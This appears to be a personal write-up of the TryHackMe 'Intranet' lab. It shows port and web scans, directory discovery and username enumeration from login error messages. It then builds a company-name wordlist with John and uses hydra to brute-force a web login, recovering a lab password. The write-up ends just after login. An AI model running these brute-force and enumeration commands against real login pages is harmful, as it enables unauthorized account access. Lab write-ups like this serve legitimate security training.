<h1 align="center">Intranet</h1>
<p align="center">2025, October 1<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>479</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Welcome to the intranet!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/3ae07dfa-7d29-40e8-9aed-2314f3707120"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/securesolacodersintra">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7391bc39-35f8-404c-a9ce-7661e9bac618"></p>

<h2>Task 1 . Find vulnerabilities and gain root access</h2>
<p>The web application development company SecureSolaCoders has created their own intranet page. The developers are still very young and inexperienced, but they ensured their boss (Magnus) that the web application was secured appropriately. The developers said, "Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again". However, Magnus was not convinced, as they had introduced many strange vulnerabilities in their customers' applications earlier.<br>


</h6><img width="400px" src="https://github.com/user-attachments/assets/c7e021fa-bd89-405e-abb1-615422fca13d">TryHackMe</p>

Magnus hired you as a third-party to conduct a penetration test of their web application. Can you successfully exploit the app and achieve root access?<br>

Start the VM by pressing the green "Start Machine" button. Please allow the machine 3 - 5 minutes to fully boot.</p>

<br>
<p><em>Answer the questions below</em></p>
<br>

<h2 align="center">Port Scanning</h2>

<p>

- &nbsp;&nbsp;&nbsp;&nbsp;<code>7</code> &nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; <code>echo</code><br>
- &nbsp;&nbsp;&nbsp;<code>21</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>FTP</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; vsftpd 3.0.5<br>
- &nbsp;&nbsp;&nbsp;<code>22</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>SSH</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)<br>
- &nbsp;&nbsp;&nbsp;<code>23</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>Telnet</code><br>
- &nbsp;&nbsp;&nbsp;<code>80</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>HTTPS</code> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ・ &nbsp;&nbsp; Apache httpd 2.4.41 ((Ubuntu))<br>
- <code>8080</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; <code>HTTP-PROXY</code> &nbsp;&nbsp; ・ &nbsp;&nbsp; Werkzeug/2.2.2 Python/3.8.10</p>

```bash
(rosana) :~/Intranet# nmap -sC -sV xx.xxx.x.xxx
...
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open  http-proxy Werkzeug/2.2.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.8.10
|     Date: Thu, 28 Aug 2025 xx:xx:xx GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
```

<br>
<h2 align="center">Vulnerability Assessment</h2>

```bash
:~# nikto -h xx.xxx.x.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.x.xxx
+ Target Hostname:    xx.xxx.x.xxx
+ Target Port:        80
+ Start Time:         2025-10-01 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x6f 0x5ecde2421fe3a 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-01 xx:xx:xx (GMT1) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Intranet# nikto -h xx.xxx.x.xxx:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.x.xxx
+ Target Hostname:    xx.xxx.x.xxx
+ Target Port:        8080
+ Start Time:         2025-10-01 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.2.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2025-10-01 xx:xx:xx (GMT1) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<br>
<h2 align="center">Virtual Environment</h2>

```bash
:~/Intranet# python3 -m venv rosana
```

```bash
:~/Intranet# source rosana/bin/activate
(rosana) :~/Intranet# 
```

<h2 align="center">Static Host Mapping</h2>

```bash
xx.xxx.x.xxx intranet.thm
```

<h2 align="center">Content Discovery</h2>
<p>

- <code>intranet.thm:8080/temporary</code> > <code>intranet.thm:8080/home</code> > <code>intranet.thm:8080/login</code></p>

```bash
(rosana) :~/Intranet# gobuster dir -u http://intranet.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 80
...
[http://intranet.thm:8080/home                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/login                (Status: 200) [Size: 2154]
http://intranet.thm:8080/admin                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/external             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/sms                  (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/logout               (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/application          (Status: 403) [Size: 213]
http://intranet.thm:8080/internal             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/temporary            (Status: 403) [Size: 213]](http://intranet.thm:8080/home                 (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/login                (Status: 200) [Size: 2154]
http://intranet.thm:8080/admin                (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/external             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/sms                  (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/logout               (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/application          (Status: 403) [Size: 213]
http://intranet.thm:8080/internal             (Status: 302) [Size: 199] [--> /login]
http://intranet.thm:8080/temporary            (Status: 403) [Size: 213]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

<h2 align="center">Web application</h2>

<img width="1062" height="552" alt="image" src="https://github.com/user-attachments/assets/aed4e827-9606-465d-80f1-e9cb1de5fb36" />

<br>
<p>

- for <code>usr</code> &nbsp;&nbsp; <code>E-mail</code>: type="text" placeholder="firstname@securesolacoders.no" name="username" id="username" value="" required<br>
- for <code>psw</code> &nbsp;&nbsp; <code>Password</code>: type="password" placeholder="Password" name="password" id="passworde" value="" required<br>
- method <code>POST</code><br>
- for any inquiries, contact <code>devops</code>@securesolacoders.no<br>Sincerely, <code>anders</code> (Senior Developer)</p>

<img width="1264" height="577" alt="image" src="https://github.com/user-attachments/assets/c2d2edd3-377e-472e-bb6a-3b32b42002dd" />

<br>
<h2 align="center">Login</h2>
<p>

- 200 OK, Invalid password for username= <code>anders</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid password for username= <code>devops</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid username for username= <code>magnus</code>%40securesolacoders.no&password=password<br>
- 200 OK, Invalid password for username= <code>admin</code>%40securesolacoders.no&password=password</p>

<h2 align="center">W.txt</h2>

```bash
anders
devops
admin
securesolacoders
password
developer
senior
```

<h2 align="center">users.txt</h2>

```bash
devops@securesolacoders.no
admin@securesolacodres.no
anders@securesolacoders.no
```

<h2 align="center">A.txt</h2>

```bash
securesolacoders
```

<h2 align="center">B.txt</h2>

```bash
:~/Intranet# john --wordlist:A.txt -rules:jumbo -stdout > B.txt
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
```

```bash
:~/Intranet# head -n 14 B.txt
securesolacoders
Securesolacoders
secure
secures
secur
securesolacoderssecuresolacoders
Sredocaloseruces
Securesolacoderssecuresolacoders
SECURESOLACODERS
sredocaloseruces
securesolacoderses
Securesolacoderses
SecuresolacodersSecuresolacoders
secu
```

```bash
:~/Intranet# sed -i 's/[^a-zA-Z0-9]//g' B.txt
```

<h2 align="center">Hydra</h2>

<p>

- <code>anders@securesolacoders.no</code> : <code>securesolarcoders2022</code></p>

```bash
(rosana) :~/Intranet# hydra -L users.txt -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:" -t 50
...
[DATA] max 50 tasks per 1 server, overall 50 tasks, 108588 login tries (l:1/p:108588), ~2172 tries per task
[DATA] attacking http-post-form://xx.xxx.x.xxx:8080/login:username=^USER^&password=^PASS^:Error:
[8080][http-post-form] host: xx.xxx.x.xxx  login: anders@securesolacoders.no   password: securesolarcoders2022
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 xx:xx:xx
```

```bash
(rosana) :~/Intranet# hydra -l anders@securesolacoders.no -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 16:42:45
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 70539 login tries (l:1/p:70539), ~4409 tries per task
[DATA] attacking http-post-form://10.201.0.156:8080/login:username=^USER^&password=^PASS^:Error:
[8080][http-post-form] host: 10.201.0.156   login: anders@securesolacoders.no   password: securesolacoders2022
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 16:43:08
```

<h2 align="center">Login</h2>
<p>
  
- Launched Burp Suite<br>
- Enabled Foxy Proxy</p>

<img width="1268" height="490" alt="image" src="https://github.com/user-attachments/assets/910b075d-a69a-44ec-abe3-c27ba51323ab" />





Badge

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/662ffa16-9933-4226-9c92-5e6ca04149ac" />


Yearly Activity

<img width="1897" height="900" alt="image" src="https://github.com/user-attachments/assets/ca3b4d47-834a-47df-a93c-64ad56b3d7e6" />



Brazil All Time 4th

<img width="1889" height="885" alt="image" src="https://github.com/user-attachments/assets/f28dc1c7-2e7c-4b8d-b718-a38ca362de53" />


Global Monthly 3,357

<img width="1901" height="895" alt="image" src="https://github.com/user-attachments/assets/5de2de8d-1680-4f6a-9b56-4501cb5b9db0" />


Brazil Montlhy 57th

<img width="1888" height="880" alt="image" src="https://github.com/user-attachments/assets/b2960334-994c-45e5-a67b-63e7b5e0f385" />

